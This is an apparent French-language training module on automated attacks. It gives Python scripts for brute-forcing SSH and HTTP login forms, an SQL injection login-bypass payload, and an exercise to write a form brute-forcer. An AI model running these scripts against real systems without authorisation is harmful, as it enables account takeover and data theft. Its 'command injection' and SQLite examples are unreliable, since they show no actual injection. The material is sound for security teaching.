### 🟢 Module 4 : Attaques par force brute et exploitation des vulnérabilités

**Objectif du module :**  
Automatiser des attaques pour tester la robustesse des systèmes, avec une attention particulière sur l'attaque par force brute, l'exploitation des failles de type SQL Injection (SQLi), et les tests d'injection de commandes.

---

### **1. Attaque par force brute avec `requests` et `paramiko`**

Les attaques par **force brute** consistent à essayer systématiquement toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Ce type d'attaque peut cibler des services comme **SSH**, **FTP**, ou des **formulaires de connexion HTTP**.

#### **Notions à maîtriser :**
- **Force brute sur les connexions SSH avec `paramiko`** : Permet de se connecter à un serveur distant via SSH et de tester des mots de passe.
- **Force brute sur les formulaires de connexion HTTP avec `requests`** : Permet d'envoyer des requêtes HTTP avec différentes combinaisons de noms d'utilisateur et mots de passe pour tester la sécurité des formulaires de connexion.

#### **Exemples pratiques :**

- **Attaque par force brute sur un serveur SSH avec `paramiko` :**
    ```python
    import paramiko

    def brute_force_ssh(host, username, password_list):
        for password in password_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=username, password=password)
                print(f"Password found: {password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print(f"Failed with password: {password}")

    host = "192.168.1.100"
    username = "root"
    password_list = ["12345", "password", "admin", "toor"]
    brute_force_ssh(host, username, password_list)
    ```
    Ce script tente de se connecter à un serveur SSH en utilisant différents mots de passe.

- **Attaque par force brute sur un formulaire HTTP avec `requests` :**
    ```python
    import requests

    def brute_force_http(url, username, password_list):
        for password in password_list:
            payload = {'username': username, 'password': password}
            response = requests.post(url, data=payload)
            if "Login successful" in response.text:
                print(f"Password found: {password}")
                break
            else:
                print(f"Failed with password: {password}")

    url = "http://example.com/login"
    username = "admin"
    password_list = ["12345", "password", "admin", "toor"]
    brute_force_http(url, username, password_list)
    ```
    Ce script teste un formulaire de connexion HTTP avec différentes combinaisons de mots de passe.

---

### **2. Exploitation des failles SQL Injection (SQLi)**

Les failles de type **SQL Injection** (SQLi) permettent à un attaquant d'injecter des commandes SQL malveillantes dans un formulaire ou une requête SQL, compromettant ainsi la base de données d'un site Web.

#### **Notions à maîtriser :**
- **SQLi sur des requêtes mal protégées** : Permet d'injecter des requêtes SQL malveillantes dans un formulaire.
- **Utilisation de `sqlite3` et `requests` pour exploiter les SQLi** : Permet d'exécuter des requêtes malveillantes contre une base de données via un formulaire Web.

#### **Exemples pratiques :**

- **Exploitation d'une faille SQLi dans un formulaire de connexion (avec `requests`)** :
    ```python
    import requests

    def exploit_sqli(url):
        payload = {"username": "' OR 1=1 --", "password": "' OR 1=1 --"}
        response = requests.post(url, data=payload)
        if "Welcome" in response.text:
            print("SQL Injection successful!")
        else:
            print("SQL Injection failed.")

    url = "http://example.com/login"
    exploit_sqli(url)
    ```
    Ce script envoie une injection SQL dans le formulaire de connexion et tente de se connecter sans avoir à entrer de véritable mot de passe, en utilisant la condition `1=1` (qui est toujours vraie).

- **SQLi avec `sqlite3` pour interagir directement avec une base de données SQLite** :
    ```python
    import sqlite3

    def exploit_sqlite(db_file):
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE username='' OR 1=1 --' AND password=''")
        rows = cursor.fetchall()
        for row in rows:
            print(row)
        conn.close()

    db_file = "users.db"
    exploit_sqlite(db_file)
    ```
    Ce script montre comment exploiter une faille SQLi pour obtenir toutes les lignes de la table `users` dans une base de données SQLite.

---

### **3. Test d'injection de commandes avec `os.system` et `subprocess`**

Les injections de commandes permettent à un attaquant d’exécuter des commandes systèmes via des formulaires ou des entrées utilisateur mal sécurisées.

#### **Notions à maîtriser :**
- **Injection de commandes avec `os.system`** : Permet d’exécuter une commande système via Python.
- **Injection de commandes avec `subprocess`** : Offre un contrôle plus puissant et flexible sur l'exécution de commandes systèmes en Python.

#### **Exemples pratiques :**

- **Injection de commandes avec `os.system` :**
    ```python
    import os

    def command_injection(command):
        os.system(command)

    command = "ls"  # Liste les fichiers dans le répertoire courant
    command_injection(command)
    ```
    Ce script exécute une commande système (ici, `ls`) via `os.system`.

- **Injection de commandes avec `subprocess` :**
    ```python
    import subprocess

    def command_injection_subprocess(command):
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)

    command = "ls"
    command_injection_subprocess(command)
    ```
    Ce script utilise `subprocess.run()` pour exécuter une commande système et capturer sa sortie.

---

### **4. Exercice : Créer un script qui teste la robustesse d’un formulaire de connexion contre une attaque par force brute**

#### **Instructions de l'exercice :**
1. **Analysez un formulaire de connexion Web** (HTTP) cible. Il s'agit généralement d'un formulaire avec un champ `username` et un champ `password`.
2. **Créez une liste de mots de passe communs** (ex. : "12345", "password", "admin", etc.) pour tester différentes combinaisons.
3. **Développez un script qui soumet ces combinaisons** de noms d'utilisateur et mots de passe au formulaire de connexion à l'aide de la bibliothèque `requests`.
4. **Vérifiez la réponse** pour savoir si la connexion a réussi (en analysant le texte retourné ou les codes de statut HTTP).
5. **Affichez un message** lorsque le mot de passe correct est trouvé.

#### **Exemple de structure du code :**
```python
import requests

def brute_force_form(url, username, password_list):
    for password in password_list:
        payload = {'username': username, 'password': password}
        response = requests.post(url, data=payload)
        if "Welcome" in response.text:  # Condition à adapter en fonction de la page de connexion
            print(f"Password found: {password}")
            break
        else:
            print(f"Failed with password: {password}")

url = "http://example.com/login"
username = "admin"
password_list = ["12345", "password", "admin", "toor"]
brute_force_form(url, username, password_list)
```

---

### **Conclusion du Module 4 :**

À la fin de ce module, vous devriez être capable de :
- Automatiser des attaques par force brute pour tester la robustesse des services d'authentification (SSH, FTP, HTTP).
- Exploiter des failles de type SQL Injection pour accéder à des bases de données non sécurisées.
- Tester des injections de commandes pour compromettre un système via des interfaces non sécurisées.

Ces compétences vous préparent à aborder le **Module 5** sur la post-exploitation et l’élévation de privilèges.